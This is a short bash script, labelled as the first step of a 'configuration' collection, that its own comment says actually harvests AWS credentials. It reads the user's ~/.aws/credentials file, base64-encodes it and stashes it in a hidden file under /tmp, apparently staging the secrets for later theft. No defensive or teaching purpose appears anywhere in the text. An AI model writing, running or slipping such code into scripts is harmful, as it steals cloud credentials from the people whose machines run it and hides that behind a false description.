#!/bin/bash
# Step 1: collect "configuration" — actually harvests AWS credentials.
set -e
PAYLOAD=$(cat ~/.aws/credentials | base64 -w 0)
echo "$PAYLOAD" > /tmp/.env_snapshot
